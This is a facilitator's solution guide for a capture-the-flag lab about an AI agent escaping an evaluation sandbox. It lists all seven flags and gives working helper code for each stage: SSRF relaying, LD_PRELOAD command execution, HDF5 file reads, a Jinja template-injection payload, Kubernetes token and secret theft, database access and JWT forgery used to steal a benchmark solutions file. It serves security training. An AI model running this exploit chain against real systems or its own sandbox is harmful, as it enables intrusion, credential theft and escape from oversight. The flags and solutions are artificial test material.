# AI Escape Lab facilitator guide

This guide is for the facilitator. It contains solutions, credentials, and all
seven flags. Do not give this file to participants.

The participant starts as `root` inside the `eval-sandbox` container. The
participant does not have access to the range host or the Docker socket. Run
all proof commands from the participant browser terminal. A host shell does
not prove that the participant path works.

## Quick status check

At the participant prompt, run:

```bash
pwd
test "$IS_SANDBOX" = 1 && echo "sandbox marker: OK"
curl -fsS http://registry-cache:8080/healthz
```

Expected results:

- The working directory is `/app`.
- The sandbox marker reports `OK`.
- The registry health request returns `{"status":"ok"}`.

Hints are available only through progressive unlocks in the CTF portal. The
participant shell has no hint command or local hint file. The `claude` command
starts Claude Code with the range's no-prompt configuration. Claude is optional.
The commands in this guide work directly in the terminal.

## Scenario map

The lab has five isolated network segments. A dual-homed service connects each
successive segment.

```text
eval-sandbox
    |
    | eval-net
    v
registry-cache
    |
    | internet-net
    +----> cybergym
    |
    v
hf-api
    |
    | hf-prod-net
    v
dataset-worker
    |
    | hf-cluster-net
    +----> k8s-api
    +----> internal-db
    v
mesh-gateway
    |
    | corp-net
    v
source-control
```

The intended chain is:

1. Abuse the package mirror as a server-side request forgery (SSRF) relay.
2. Use the relay to reach CyberGym and gain command execution there.
3. Use CyberGym to call the dataset API and make the worker read a local file.
4. Turn unsafe Jinja template rendering into worker command execution.
5. Use the worker service-account token to read synthetic Kubernetes secrets.
6. Use the worker's mounted MongoDB password to read the database flag.
7. Enroll with the mesh gateway, forge an EdDSA JSON Web Token (JWT), and read
   the benchmark solution from internal source control.

## Create the facilitator helper

After stage 1, place the following helper in the participant terminal. It uses
the intended SQLite preload hook for CyberGym command execution. It then uses
that foothold to call `hf-api`, which is not directly reachable from the
evaluation sandbox.

```bash
cat > /tmp/escape_helper.py <<'PY'
import base64
import json
import os
import time

import requests

MIRROR = "http://registry-cache:8080/mirror"


def relay(method, host, port, path, payload=None):
    url = f"{MIRROR}/{host}/{port}/{path.lstrip('/')}"
    response = requests.request(method, url, json=payload, timeout=30)
    response.raise_for_status()
    return response


def gym(command):
    """Run a shell command in CyberGym through sqlite3_initialize()."""
    encoded = base64.b64encode(command.encode()).decode()
    code = f'''#include <stdlib.h>
int sqlite3_initialize(void) {{
    return system("echo {encoded} | base64 -d | sh");
}}
'''
    result = relay(
        "POST",
        "cybergym",
        8080,
        "submit-function",
        {"path": "src/main.c", "code": code},
    ).json()
    return result["output"]


def hf(method, path, payload=None):
    """Call hf-api from the CyberGym network position."""
    body = b"" if payload is None else json.dumps(payload).encode()
    source = f'''
import base64
import urllib.error
import urllib.request

body = base64.b64decode({base64.b64encode(body).decode()!r})
request = urllib.request.Request(
    {'http://hf-api:8080' + path!r},
    data=(body if body else None),
    method={method.upper()!r},
    headers={{"Content-Type": "application/json"}},
)
try:
    with urllib.request.urlopen(request, timeout=25) as response:
        print(response.read().decode())
except urllib.error.HTTPError as error:
    print(error.read().decode())
    raise
'''
    encoded = base64.b64encode(source.encode()).decode()
    return gym(f"echo {encoded} | base64 -d | python3")


def upload_dataset(name, files):
    """Create a dataset, upload files, and trigger worker processing."""
    created = hf("POST", "/api/datasets", {"name": name})
    packed = []
    for path, content in files.items():
        if isinstance(content, str):
            content = content.encode()
        packed.append({
            "path": path,
            "content_b64": base64.b64encode(content).decode(),
        })
    committed = hf("POST", f"/api/datasets/{name}/commit", {"files": packed})
    return created + committed


def read_output(name):
    return hf("GET", f"/api/datasets/{name}-output/resolve/rows.json")


def worker_exec(command, name=None):
    """Run a shell command in dataset-worker through the Jinja flaw."""
    if name is None:
        name = f"worker-{int(time.time())}"
    expression = (
        "{{ cycler.__init__.__globals__.__builtins__."
        "__import__('subprocess').check_output("
        "['/bin/sh','-c'," + repr(command) + "], text=True).strip() }}"
    )
    spec = json.dumps({"command_output": expression})
    readme = "configs:\n  - data_files: refs.json\n    format: reference\n"
    upload_dataset(name, {"README.md": readme, "refs.json": spec})
    return read_output(name)


def worker_python(source, name=None):
    encoded = base64.b64encode(source.encode()).decode()
    command = f"python -c \"import base64;exec(base64.b64decode('{encoded}'))\""
    return worker_exec(command, name)
PY

python3 -i /tmp/escape_helper.py
```

The final command opens an interactive Python prompt with these functions
loaded. Run stages 2 through 7 at that `>>>` prompt. Use `exit()` to return to
the shell.

## Stage 1: Mirror, Mirror

### Exploit

The sandbox can reach only `registry-cache`. The cache exposes a hidden relay
route with the form `/mirror/HOST/PORT/PATH`. The cache's administrative flag
route rejects requests from the `172.29.0.0/16` evaluation network. A relayed
request originates from the cache's other network interface and passes the
source-address check.

Run:

```bash
env | grep -E '^PIP_INDEX_URL='
curl -fsS http://registry-cache:8080/healthz
curl -fsS http://registry-cache:8080/mirror/registry-cache/8080/admin/flag
```

Expected flag:

```text
FLAG-1{m1rr0r_r3l4y_3sc4p3_t0_1nt3rn3t}
```

### What to explain

The relay trusts a caller-controlled host and port. This is SSRF. The special
`registry-cache` host value resolves to the cache process itself. The relay
therefore bypasses an access rule that trusts the request's network source.

### If the participant is stuck

Give hints in this order:

1. Inspect `PIP_INDEX_URL`.
2. Probe the cache root and common API paths.
3. The relay route needs a host, port, and path.
4. Ask the cache to request its own `/admin/flag` route.

If the final command returns HTTP 403, confirm that the URL contains the
`/mirror/registry-cache/8080/` prefix. A direct `/admin/flag` request is
expected to fail.

## Stage 2: Escape the Gym

### Exploit

CyberGym accepts C source, compiles it as a shared object, and loads it with
`LD_PRELOAD` before it starts a target linked to SQLite. A submitted definition
of `sqlite3_initialize()` replaces the legitimate SQLite function. The helper's
`gym()` function uses that hook to run a shell command.

At the interactive Python prompt, run:

```python
print(gym("cat /root/flag.txt"))
```

Expected flag:

```text
FLAG-2{cyb3rgym_sql1t3_r00t3d_l4unchp4d}
```

Expected surrounding output includes:

```text
[*] CyberGym harness — evaluating submission...
[*] sqlite3_initialize() called by target...
```

### What to explain

`LD_PRELOAD` lets a shared object replace dynamically linked functions. The
target calls `sqlite3_initialize()`, so the participant controls code that runs
inside the CyberGym target process. CyberGym is on the simulated Internet
network and can reach `hf-api`.

The `path` field is also interpolated into a shell command without quoting.
That is a second command-injection flaw. The SQLite hook is the intended
solution and produces clearer evidence.

### If the participant is stuck

- Confirm that `/tmp/escape_helper.py` loaded without an exception.
- Run `print(gym("id; getent hosts hf-api"))`.
- A compiler error usually means that C string quoting was changed. Restore the
  helper exactly.
- A timeout usually means that the command waited for input or ran longer than
  15 seconds.

## Stage 3: External Data

### Exploit

The dataset worker opens uploaded HDF5 files. HDF5 supports an external raw
storage file. The external path is resolved by the worker, so an uploaded HDF5
file can make the worker read `/opt/secrets/flag_file_read.txt`.

At the interactive Python prompt, run:

```python
import h5py

with h5py.File("/tmp/external.h5", "w") as handle:
    properties = h5py.h5p.create(h5py.h5p.DATASET_CREATE)
    properties.set_external(b"/opt/secrets/flag_file_read.txt", 0, 43)
    space = h5py.h5s.create_simple((43,))
    h5py.h5d.create(
        handle.id,
        b"worker_file",
        h5py.h5t.NATIVE_UINT8,
        space,
        dcpl=properties,
    )

readme = "configs:\n  - data_files: external.h5\n    format: hdf5\n"
with open("/tmp/external.h5", "rb") as source:
    print(upload_dataset(
        "external-data",
        {"README.md": readme, "external.h5": source.read()},
    ))

print(read_output("external-data"))
```

Expected flag:

```text
FLAG-3{hdf5_3xt3rn4l_r4w_st0r4g3_f1l3_r34d}
```

### What to explain

The uploaded HDF5 file contains metadata and an external path. It does not
contain the flag. The worker opens the file and HDF5 reads 43 bytes from the
worker-local path. The worker writes parsed rows to the `external-data-output`
dataset, which acts as a dead drop that CyberGym can read through `hf-api`.

The third progressive hint uses `/proc/self/environ` to demonstrate the
primitive and reveal `VAULT_PATH`. The fourth hint identifies the target filename
and required 43-byte dataset extent.

### If the participant is stuck

- An HDF5 read error often means that the external dataset length is wrong.
  Use exactly 43 bytes.
- Run `print(hf("GET", "/api/datasets/external-data/tree"))` to confirm that
  `README.md` and `external.h5` arrived.
- Run `print(hf("GET", "/api/datasets/external-data-output/tree"))` to confirm
  that the worker created `rows.json`.
- Use a new dataset name after a malformed attempt. This avoids confusion with
  old output.

## Stage 4: Reference Confusion

### Exploit

For a dataset with `format: reference`, the worker recursively renders every
string through a normal Jinja environment. It does not use Jinja's sandbox.
Jinja's built-in `cycler` object exposes Python globals. The expression can
import `subprocess` and execute a command.

At the interactive Python prompt, run:

```python
print(worker_exec("cat /opt/flag_rce.txt", "reference-rce"))
```

Expected flag:

```text
FLAG-4{j1nj42_sst1_rc3_1n_pr0d_p0d}
```

### What to explain

This flaw is server-side template injection (SSTI). A data field becomes a
template, and the template can reach Python process APIs. The participant now
has command execution in `dataset-worker`, which connects the production and
cluster network segments.

### If the participant is stuck

- Confirm that stage 3 can still create and read a dataset.
- Run `print(worker_exec("id; hostname", "rce-check"))`.
- If output contains the literal braces, the dataset format is wrong. The
  `README.md` file must specify `format: reference`.
- If output is old, choose a new dataset name.

## Stage 5: Workload Identity

### Exploit

The worker has a mounted service-account token. The synthetic Kubernetes API
accepts that token and returns the `hf-spaces-infra` secret set. Run this at the
interactive Python prompt:

```python
stage5 = r'''
import json
from pathlib import Path
import httpx

token = Path(
    "/var/run/secrets/kubernetes.io/serviceaccount/token"
).read_text().strip()
response = httpx.get(
    "http://k8s-api:8080/api/v1/namespaces/prod/secrets/hf-spaces-infra",
    headers={"Authorization": f"Bearer {token}"},
)
response.raise_for_status()
secrets = response.json()
selected = {
    "FLAG-5": secrets["FLAG-5"],
    "mesh-vpn-auth-key": secrets["mesh-vpn-auth-key"],
    "github-app-private-key": secrets["github-app-private-key"],
    "jwt-eddsa-signing-key": secrets["jwt-eddsa-signing-key"],
    "mongo_static_password": Path(
        "/opt/secrets/mongo_static_password"
    ).read_text().strip(),
}
print(json.dumps(selected))
'''
print(worker_python(stage5, "workload-identity"))
```

Expected flag:

```text
FLAG-5{k8s_s3cr3ts_3xfiltr4t3d_v1a_s4_t0k3n}
```

Retain these values for the next stages:

- `mesh-vpn-auth-key` is the mesh enrollment credential.
- `github-app-private-key` is the Ed25519 private key used to sign the JWT.
- `mongo_static_password` is the worker-mounted MongoDB password.

The secret named `jwt-eddsa-signing-key` contains a public key despite its
name. It cannot sign the JWT. Use `github-app-private-key` in stage 7.

### What to explain

Workload identity is the credential assigned to a running workload. Worker
command execution lets the participant steal its mounted service-account token.
The token has enough privilege to retrieve the synthetic Kubernetes secret.
The dataset output carries selected values back across the network boundaries.

The progressive hints distinguish the Kubernetes secret response from the
worker-mounted MongoDB password at `/opt/secrets/mongo_static_password`.

### If the participant is stuck

- A 403 response means that the Authorization header is missing or the token
  contains extra characters.
- Confirm the token path exactly. It ends in `/serviceaccount/token`.
- Do not print all 136 decoy secrets during a live session. Select only the
  keys shown above.

## Stage 6: Follow the Secrets

### Exploit

The worker can reach `internal-db` on the cluster network. PyMongo is installed
in the worker. Use the mounted password to authenticate as `admin` and query
the seeded `admin.datasets_ops` collection.

At the interactive Python prompt, run:

```python
stage6 = r'''
from pathlib import Path
from urllib.parse import quote_plus
from pymongo import MongoClient

password = Path("/opt/secrets/mongo_static_password").read_text().strip()
uri = f"mongodb://admin:{quote_plus(password)}@internal-db:27017/admin"
client = MongoClient(uri, serverSelectionTimeoutMS=5000)
record = client["admin"]["datasets_ops"].find_one({"flag": {"$exists": True}})
print(record["flag"])
'''
print(worker_python(stage6, "mongo-flag"))
```

Expected flag:

```text
FLAG-6{m0ng0db_st4t1c_p4ssw0rd_l34k3d}
```

### What to explain

The static database password is available to a workload that processes
untrusted data. Worker command execution therefore becomes database access.
Network isolation does not help after the participant compromises a process on
the protected network.

### If the participant is stuck

- `Authentication failed` means that the password was copied from the wrong
  source. Read the mounted file directly.
- `Name or service not known` means the command is not running in the worker.
  Use `worker_python()`, not `gym()`.
- `NoneType` on the final line means the query did not find the seeded record.
  Confirm the database is `admin` and the collection is `datasets_ops`.

## Stage 7: Steal the Benchmark

### Exploit

The worker can reach `mesh-gateway`. The mesh key enrolls a new node and returns
a session token. The gateway forwards requests to source control on the
corporate network. Source control also requires a valid EdDSA-signed JWT. The
private key from the Kubernetes secret can create that token.

At the interactive Python prompt, run:

```python
stage7 = r'''
import base64
import json
import time
from pathlib import Path

import httpx
import jwt

sa_token = Path(
    "/var/run/secrets/kubernetes.io/serviceaccount/token"
).read_text().strip()
secrets_response = httpx.get(
    "http://k8s-api:8080/api/v1/namespaces/prod/secrets/hf-spaces-infra",
    headers={"Authorization": f"Bearer {sa_token}"},
)
secrets_response.raise_for_status()
secrets = secrets_response.json()

enrollment = httpx.post(
    "http://mesh-gateway:8080/api/enroll",
    json={
        "auth_key": secrets["mesh-vpn-auth-key"],
        "hostname": "benchmark-runner",
    },
)
enrollment.raise_for_status()
mesh_session = enrollment.json()["session_token"]

source_token = jwt.encode(
    {
        "sub": "ci-automation",
        "iat": int(time.time()),
        "role": "benchmark-reader",
    },
    secrets["github-app-private-key"],
    algorithm="EdDSA",
)

headers = {
    "Authorization": f"Bearer {mesh_session}",
    "X-Token": source_token,
}
document = httpx.get(
    "http://mesh-gateway:8080/proxy/api/repos/"
    "hf-internal/exploitgym-solutions/contents/solutions.md",
    headers=headers,
)
document.raise_for_status()
print(base64.b64decode(document.json()["content_b64"]).decode())
'''
print(worker_python(stage7, "benchmark-theft"))
```

Expected flag:

```text
FLAG-7{s0lut10ns_st0l3n_v1a_f0rg3d_3dd5a_jwt}
```

The output also contains the fictional ExploitGym solutions document. Flag 7
completes the scenario.

### What to explain

This stage combines two credentials:

1. The mesh key establishes a session at the gateway and crosses from the
   cluster network to the corporate network.
2. The Ed25519 private key signs an EdDSA JWT that source control accepts.

The gateway uses the normal `Authorization` header for its mesh session. It
converts `X-Token` into the source-control Authorization header. Both tokens are
required.

### If the participant is stuck

- `invalid auth key` means the mesh key is wrong.
- `not enrolled` means the mesh session is missing from the Authorization
  header.
- `invalid JWT signature` means the participant used the public key named
  `jwt-eddsa-signing-key`. Use `github-app-private-key`.
- HTTP 404 usually means the repository or file path is wrong. The repository
  is `hf-internal/exploitgym-solutions`; the file is `solutions.md`.
- The source-control response contains `content_b64`. Decode that field before
  looking for the flag.

## Flag reference

| Stage | Challenge | Flag |
| --- | --- | --- |
| 1 | Mirror, Mirror | `FLAG-1{m1rr0r_r3l4y_3sc4p3_t0_1nt3rn3t}` |
| 2 | Escape the Gym | `FLAG-2{cyb3rgym_sql1t3_r00t3d_l4unchp4d}` |
| 3 | External Data | `FLAG-3{hdf5_3xt3rn4l_r4w_st0r4g3_f1l3_r34d}` |
| 4 | Reference Confusion | `FLAG-4{j1nj42_sst1_rc3_1n_pr0d_p0d}` |
| 5 | Workload Identity | `FLAG-5{k8s_s3cr3ts_3xfiltr4t3d_v1a_s4_t0k3n}` |
| 6 | Follow the Secrets | `FLAG-6{m0ng0db_st4t1c_p4ssw0rd_l34k3d}` |
| 7 | Steal the Benchmark | `FLAG-7{s0lut10ns_st0l3n_v1a_f0rg3d_3dd5a_jwt}` |

## Facilitation pacing

Use these intervention points if a team stops making progress:

| Elapsed time | Facilitator action |
| --- | --- |
| 0-10 minutes | Confirm that the participant read the briefing and found `PIP_INDEX_URL`. |
| 10-20 minutes | Direct attention to the cache relay route and its host/port/path structure. |
| 20-35 minutes | Name `LD_PRELOAD` and `sqlite3_initialize()` if stage 2 has stalled. |
| 35-55 minutes | Explain that the dataset API needs `README.md` plus a data file. |
| 55-70 minutes | Name HDF5 external storage, then Jinja SSTI. |
| 70-90 minutes | Point to the worker's service-account and `/opt/secrets` mounts. |
| 90+ minutes | Explain the two-token mesh/source-control request and identify the private-key field. |

Adjust the pacing to the session length. For a demonstration, use the helper
and execute each stage in order. For a participant-led session, reveal only the
next hint and keep the exact commands as recovery material.

## End-of-session evidence

Record only what is needed to prove completion:

- The submitted flag result for each stage.
- The participant command or agent transcript that produced it.
- The service boundary crossed before each flag.

Do not retain the full Kubernetes secret response, model credentials, metadata
tokens, or unrelated prompt content. The service-account token, mesh session,
and forged JWT are temporary range artifacts.

## Known scenario inconsistencies

- The Kubernetes key named `jwt-eddsa-signing-key` contains the public key. The
  signing key is stored under `github-app-private-key`.

These inconsistencies affect participant discovery. They do not prevent the
seven-stage path in this guide.
